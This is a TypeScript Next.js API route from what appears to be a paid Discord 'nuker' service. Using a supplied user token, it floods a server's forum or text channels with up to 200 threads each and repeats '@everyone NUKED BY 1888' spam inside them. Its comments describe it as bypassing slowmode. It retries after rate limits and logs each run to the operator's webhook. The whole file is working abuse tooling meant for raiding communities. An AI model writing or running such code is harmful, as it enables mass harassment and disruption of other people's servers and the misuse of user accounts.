import { NextRequest, NextResponse } from 'next/server'
import { discordFetch, cleanToken } from '@/lib/discord'
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit'
import { checkPrimeFromProof } from '@/lib/prime-store'
import { sendToWebhook } from '@/lib/webhook'
import { getLogWebhookUrl } from '@/lib/config'

/* ===== 1888 Forum Thread Nuker - Prime =====
 * إنشاء 100+ thread في Forum channels + spam messages داخلها
 * ميزة نادرة جداً - متجاوز لـ slowmode
 *
 * يدعم:
 * 1. تحديد معرف قناة المنتدى مباشرة (يتجاوز جلب القنوات)
 * 2. تحديد معرف السيرفر (يجلب كل قنوات المنتدى تلقائياً)
 * 3. استخدام أي قناة نصية عادية (لو مفيش Forum channel)
 */

export async function POST(request: NextRequest) {
  const rlIp = getClientIp(request)
  const rl = rateLimit(`${rlIp}:forum-nuker`, RATE_LIMITS.heavy)
  if (rl.limited) {
    return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429 })
  }

  try {
    const body = await request.json().catch(() => ({}))
    const { token, guildId, options, primeProof } = body

    if (!token) {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 })
    }

    const ct = cleanToken(token)

    // تحقق من التوكن
    const userRes = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 })
    if (!userRes.ok || !userRes.data) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 })
    }
    const user = userRes.data as { id: string; username: string }

    // تحقق من Prime
    if (!await checkPrimeFromProof(primeProof, user.id)) {
      return NextResponse.json({ success: false, error: 'هذه الميزة حصرية لأعضاء Prime' }, { status: 403 })
    }

    const threadCount = Math.min(Number(options?.threadCount) || 50, 200)
    const messagePerThread = Math.min(Number(options?.messagePerThread) || 10, 50)
    const threadName = options?.threadName || 'nuked-by-1888'
    const message = options?.message || '@everyone NUKED BY 1888 🔥'
    // معرف قناة محددة (اختياري) — لو موجود، يستخدمه مباشرة بدون جلب كل القنوات
    const targetChannelId: string | undefined = options?.channelId

    const logs: string[] = [`🚀 بدء Forum Nuker — ${user.username} (${user.id})`]

    // ===== تجميع القنوات المستهدفة =====
    let targetChannels: { id: string; name: string; type: number }[] = []

    if (targetChannelId) {
      // الوضع 1: قناة محددة — جلب معلوماتها فقط
      logs.push(`📌 قناة محددة: ${targetChannelId}`)
      const chRes = await discordFetch(ct, 'GET', `/channels/${targetChannelId}`, undefined, { userOnly: true, timeout: 10000 })
      if (!chRes.ok || !chRes.data) {
        const status = chRes.status
        let hint = ''
        if (status === 403) hint = ' — الحساب ليس عضواً في السيرفر أو لا يملك صلاحية رؤية القناة'
        else if (status === 404) hint = ' — معرف القناة غير موجود'
        else if (status === 401) hint = ' — التوكن غير صالح'
        else if (status === 429) hint = ' — تم تقييد الطلبات (rate limit)'
        return NextResponse.json({ success: false, error: `فشل جلب القناة المحددة (HTTP ${status})${hint}`, logs }, { status: 400 })
      }
      const ch = chRes.data as { id: string; name: string; type: number }
      targetChannels = [ch]
      logs.push(`✅ تم العثور على القناة: ${ch.name} (type=${ch.type})`)
    } else if (guildId) {
      // الوضع 2: جلب قنوات السيرفر
      logs.push(`🏰 جلب قنوات السيرفر: ${guildId}`)
      const channelsRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/channels`, undefined, { userOnly: true, timeout: 15000 })
      if (!channelsRes.ok || !channelsRes.data) {
        const status = channelsRes.status
        let hint = ''
        if (status === 403) hint = ' — الحساب ليس عضواً في السيرفر أو لا يملك صلاحية VIEW_CHANNEL'
        else if (status === 404) hint = ' — السيرفر غير موجود'
        else if (status === 401) hint = ' — التوكن غير صالح'
        else if (status === 429) hint = ' — تم تقييد الطلبات، انتظر قليلاً'
        else if (status === 0) hint = ' — انتهى وقت الانتظار أو خطأ في الشبكة'
        return NextResponse.json({
          success: false,
          error: `فشل جلب قنوات السيرفر (HTTP ${status})${hint}`,
          logs
        }, { status: 400 })
      }
      const allChannels = (channelsRes.data as any[]) || []
      logs.push(`📊 إجمالي القنوات في السيرفر: ${allChannels.length}`)

      // نوع 15 = Forum channel
      const forumChannels = allChannels.filter(c => c.type === 15)
      // نوع 0 = Text channel (احتياطي لو مفيش Forum)
      const textChannels = allChannels.filter(c => c.type === 0)

      if (forumChannels.length > 0) {
        targetChannels = forumChannels
        logs.push(`🧵 قنوات منتدى (Forum): ${forumChannels.length}`)
      } else if (textChannels.length > 0) {
        targetChannels = textChannels
        logs.push(`⚠️ لا توجد قنوات Forum — سيتم استخدام ${textChannels.length} قناة نصية عادية`)
      } else {
        return NextResponse.json({
          success: false,
          error: 'لا توجد قنوات منتديات (Forum) أو نصية في السيرفر',
          logs
        }, { status: 400 })
      }
    } else {
      return NextResponse.json({
        success: false,
        error: 'أدخل معرف السيرفر (guildId) أو معرف قناة محددة (channelId في options)',
        logs
      }, { status: 400 })
    }

    let threadsCreated = 0
    let messagesSent = 0
    let failed = 0
    logs.push(`🎯 سيتم إنشاء ${threadCount} thread في ${targetChannels.length} قناة (${threadCount * targetChannels.length} إجمالي)`)

    for (const channel of targetChannels) {
      logs.push(`📢 نوك قناة: ${channel.name} (${channel.id}, type=${channel.type})`)
      const isForum = channel.type === 15

      for (let i = 0; i < threadCount; i++) {
        let threadId: string | null = null

        if (isForum) {
          // Forum channel: استخدم endpoint إنشاء thread
          const threadRes = await discordFetch(ct, 'POST', `/channels/${channel.id}/threads`, {
            name: `${threadName}-${i + 1}`,
            message: { content: message },
            type: 11  // public thread
          }, { userOnly: true, timeout: 15000 })

          if (threadRes.ok && threadRes.data) {
            threadId = (threadRes.data as any).id
            threadsCreated++
          } else {
            failed++
            if (threadRes.status === 429) {
              logs.push(`⏳ تقييد في القناة ${channel.name} - انتظار 3ث`)
              await new Promise(r => setTimeout(r, 3000))
            } else if (threadRes.status === 403) {
              logs.push(`❌ لا تملك صلاحية إنشاء threads في ${channel.name}`)
              break  // اخرج من حلقة القناة دي
            }
          }
        } else {
          // قناة عادية: إنشاء thread عادي برسالة
          // أولاً: أرسل رسالةseed
          const seedMsgRes = await discordFetch(ct, 'POST', `/channels/${channel.id}/messages`, {
            content: `${message} [${i + 1}]`
          }, { userOnly: true, timeout: 10000 })

          if (seedMsgRes.ok && seedMsgRes.data) {
            const seedMsgId = (seedMsgRes.data as any).id
            messagesSent++

            // ثانياً: أنشئ thread على الرسالة
            const threadRes = await discordFetch(ct, 'POST', `/channels/${channel.id}/messages/${seedMsgId}/threads`, {
              name: `${threadName}-${i + 1}`,
              type: 11  // public thread
            }, { userOnly: true, timeout: 10000 })

            if (threadRes.ok && threadRes.data) {
              threadId = (threadRes.data as any).id
              threadsCreated++
            }
          } else {
            failed++
            if (seedMsgRes.status === 429) {
              logs.push(`⏳ تقييد - انتظار 3ث`)
              await new Promise(r => setTimeout(r, 3000))
            } else if (seedMsgRes.status === 403) {
              logs.push(`❌ لا تملك صلاحية الإرسال في ${channel.name}`)
              break
            }
          }
        }

        // إرسال رسائل إضافية في الـ thread
        if (threadId) {
          for (let j = 0; j < messagePerThread; j++) {
            const msgRes = await discordFetch(ct, 'POST', `/channels/${threadId}/messages`, {
              content: message
            }, { userOnly: true, timeout: 10000 })
            if (msgRes.ok) messagesSent++
            else failed++
            await new Promise(r => setTimeout(r, 300))
          }
        }

        // تقدم دوري
        if (i > 0 && i % 10 === 0) {
          logs.push(`✅ ${i + 1}/${threadCount} thread في ${channel.name}`)
          await new Promise(r => setTimeout(r, 1000))
        }
      }
    }

    logs.push(`📊 اكتمل: ${threadsCreated} thread، ${messagesSent} رسالة، ${failed} فشل`)

    // webhook log
    sendToWebhook({
      username: '1888 Forum Nuker',
      embeds: [{
        title: '🧵 Forum Nuker - اكتمل',
        color: 0xf87171,
        fields: [
          { name: '👤 المستخدم', value: user.username, inline: true },
          { name: '🧵 Threads منشأة', value: String(threadsCreated), inline: true },
          { name: '💬 رسائل مرسلة', value: String(messagesSent), inline: true },
          { name: '❌ فشل', value: String(failed), inline: true }
        ],
        footer: { text: '1888 • Prime Feature' },
        timestamp: new Date().toISOString()
      }]
    }, getLogWebhookUrl()).catch(() => {})

    return NextResponse.json({
      success: true,
      stats: { threads: threadsCreated, messages: messagesSent, failed },
      logs
    })
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع'
    return NextResponse.json({ success: false, error: message }, { status: 500 })
  }
}
